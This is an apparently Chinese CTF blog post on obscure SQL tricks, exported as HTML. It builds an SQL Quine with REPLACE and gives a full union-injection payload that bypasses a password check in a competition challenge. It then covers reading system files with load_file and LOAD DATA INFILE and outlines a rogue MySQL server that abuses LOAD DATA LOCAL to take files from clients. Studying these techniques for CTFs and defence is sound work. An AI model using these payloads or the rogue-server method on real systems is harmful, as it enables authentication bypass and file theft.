@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"/><meta content="width=device-width initial-scale=1" name="viewport"/><link href="main.css" rel="stylesheet"/></head><body class="typora-export os-windows"><div class="typora-export-content"><div class="" id="write"><hr/>
+<p>title: 偏门SQL
+date: 2024-04-7
+categories:
+- [Tips]</p>
+<hr/>
+<h1>Quine</h1>
+<p>直接把题拿出来看，其实暂时不用怎么看，大概知道一下就行</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">$password=$_POST['password'];
+if ($username !== 'admin') {
+    alertMes('only admin can login', 'index.php');
+}
+checkSql($password);
+$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
+$user_result=mysqli_query($con,$sql);
+$row = mysqli_fetch_array($user_result);
+if (!$row) {
+    alertMes("something wrong",'index.php');
+}
+if ($row['password'] === $password) {
+    die($FLAG);
+}
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>题目要求数据库里的password和传入的psd强相等，爆了之后发现数据库中的password是空表。看似就没有任何办法做到相等然后出flag了。</p>
+<p>但是有一种方法可以</p>
+<h2>什么是Quine</h2>
+<p>Quine就是输入和输出的语句完全一致，例如：</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">&lt;&lt;this is in
+&gt;&gt;this is in
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>如果能做到这样，使用某种办法将输入的内容原封不动输出出来，就完成了一次Quine构造</p>
+<p>在sql中能利用replace函数做到Quine构造</p>
+<blockquote>
+<p>replace()函数</p>
+<p>replace(object,search,replace) 把object对象中出现的search全部替换成replace</p>
+</blockquote>
+<p>构造的基本形式就是</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">REPLACE(str,编码的间隔符,str)
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>其中，str为</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">REPLACE(间隔符,编码的间隔符,间隔符)
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>组合就变成了==&gt;</p>
+<blockquote>
+<p _="%" endraw="endraw">{% raw %}
+REPLACE(<span style="color:red">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)</p>
+</blockquote>
+<p>这样就把str1中的间隔符又换成了str2，具体的替换用颜色表示一下</p>
+<blockquote>
+<p _="%" endraw="endraw">{% raw %}
+<span style="color:red">REPLACE(<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)</span></p>
+</blockquote>
+<p>可以见得，这样替换之后的内容就大致相同了</p>
+<p>直接给出一条语句试一下</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">select REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")');
++---------------------------------------------------------------------------+
+| REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")') |
++---------------------------------------------------------------------------+
+| REPLACE("REPLACE(".",CHAR(46),".")",CHAR(46),"REPLACE(".",CHAR(46),".")") |
++---------------------------------------------------------------------------+
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>细致看一下，还是有单双引号的区别。不能一直用双引号<code>"</code>，会导致异常闭合，所以得单引号里嵌套双引号。</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">Quine: REPLACE('str',编码的间隔符,'str')
+str: REPLACE("间隔符",编码的间隔符,"间隔符")
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>运算后的结果是<code>REPLACE("str",编码的间隔符,"str")</code>，所以让结果的str也用单引号包裹就能让输入和查询结果完全一致了</p>
+<p>那要如何解决但双引号不一致的问题呢？很简单，再replace一下就好了。<code>CHAR(34)-&gt;"</code>，<code>CHAR(39)-&gt;'</code></p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">Quine:REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
+  str:REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<blockquote>
+<p>实际上是先将str里的双引号替换成单引号，再用str替换str里的间隔符</p>
+</blockquote>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">select replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<h2>再从payload理解为什么要用Quine</h2>
+<p><strong>第五空间智能安全大赛-Web-yet_another_mysql_injection</strong></p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">$password=$_POST['password'];
+if ($username !== 'admin') {
+    alertMes('only admin can login', 'index.php');
+}
+checkSql($password);
+$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
+$user_result=mysqli_query($con,$sql);
+$row = mysqli_fetch_array($user_result);
+if (!$row) {
+    alertMes("something wrong",'index.php');
+}
+if ($row['password'] === $password) {
+    die($FLAG);
+}
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>waf封了空格，直接用内联就行了。这里为了方便看就用回空格</p>
+<blockquote>
+<p>1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#
+组合sql语句就是：
+SELECT password FROM users WHERE username='admin' and password='1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#';</p>
+</blockquote>
+<p>这时候，由于使用的是联合注入，当前文报错，就会回显后面的</p>
+<blockquote>
+<p>1' union select replace(replace('1" union select replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1" union select replace(replace(".",char(34),char(39)),char(46),".")#')#';</p>
+</blockquote>
+<p>这就让<code>$row['password']</code>等于了这一串，而这一串刚好和输入的<code>$psw</code>相等，完成了绕过</p>
+<h1>Load DATA</h1>
+<p>其实在打比赛的时候经常拿到数据库之后经常就会尝试直接读文件，这个时候用的一般都是<code>load_file</code>这个函数</p>
+<p>例如</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">select load_file('/etc/hosts');
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411142808596" src="https://img.b1xcy.top/img/202404111428688.png?x-oss-process=style/img2webp"/></p>
+<p>但是当<code>load_file</code>这个函数被ban的时候，还有<code>LOAD DATA</code>可以用</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">LOAD DATA INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY '\n';
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411143227140" src="https://img.b1xcy.top/img/202404111432167.png?x-oss-process=style/img2webp"/></p>
+<p>而参考<code>LOAD DATA</code>的用法，有一个关键词<code>flag</code>可以被使用</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">LOAD DATA
+    [LOW_PRIORITY | CONCURRENT] [LOCAL]
+    INFILE 'file_name'
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>就是这个<code>LOCAL</code></p>
+<p>当在客户端(windows)连接到服务端(kali)时，可以执行</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">LOAD DATA local INFILE "D:\\test.txt" INTO TABLE test FIELDS TERMINATED BY '\n';
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p>这样就实现了远程数据的传输，当然前提是客户端的权限足够</p>
+<p><img alt="image-20240411145751995" src="https://img.b1xcy.top/img/202404111457023.png?x-oss-process=style/img2webp"/></p>
+<p>先看最基础的mysql握手</p>
+<pre class="md-fences md-end-block ty-contain-cm modeLoaded" lang="" spellcheck="false"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocapitalize="off" autocorrect="off" spellcheck="false" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class="CodeMirror-line" role="presentation"><span class="presentation" style="padding-right: 0.1px;">mysql -uroot -p --host=127.0.0.1 --port=3306 --default-character-set=utf8 --local-infile=1
+</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre>
+<p><img alt="image-20240411151601163" src="https://img.b1xcy.top/img/202404111516220.png?x-oss-process=style/img2webp"/></p>
+<p>前面就是基本的握手，但是在9-10条中间穿插了一个查询</p>
+<p><img alt="image-20240411152407795" src="https://img.b1xcy.top/img/202404111524813.png?x-oss-process=style/img2webp"/></p>
+<p>按理来说这是十分安全的沟通协议，但是参考<a href="https://dev.mysql.com/doc/refman/8.3/en/load-data-local-security.html">Security Considerations for LOAD DATA LOCAL</a></p>
+<p><img alt="image-20240411153409876" src="https://img.b1xcy.top/img/202404111534896.png?x-oss-process=style/img2webp"/></p>
+<p>也就是说，patch之后的服务器可以向任何语句穿插文件请求，只要是客户端开启了<code>local-infile</code>的权限</p>
+<p>这也是为什么先前的连接语句中指定了<code>--local-infile=1</code></p>
+<p>对于原本正常的握手流程应该是(前三次TCP握手忽略):</p>
+<table>
+<thead>
+<tr>
+<th>服务端</th>
+<th>客户端</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ServerGreeting(协议、服务器版本等)-&gt;</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;-Login(密码，是否允许LOAD等参数)</td>
+</tr>
+<tr>
+<td>OK-&gt;</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;-RequestQuery查询</td>
+</tr>
+<tr>
+<td>Response查询结果-&gt;</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>我们可以构造一个恶意服务端，在返回查询结果前向客户端要求LOAD DATA LOCAL</p>
+<table>
+<thead>
+<tr>
+<th>服务端</th>
+<th>客户端</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Server Greeting(协议、服务器版本等)-&gt;</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;-Login(密码，是否允许LOAD等参数)</td>
+</tr>
+<tr>
+<td>OK-&gt;</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;-Request Query查询</td>
+</tr>
+<tr>
+<td>LOAD DATA LOCAL-&gt;</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;-查询结果</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="image-20240411161124285" src="https://img.b1xcy.top/img/202404111611329.png?x-oss-process=style/img2webp"/></p>
+<p>可以看到，在客户端主动发送了版本号等查询后，服务端没有返回，而是接着发起了一个LOCAL INFILE的查询</p>
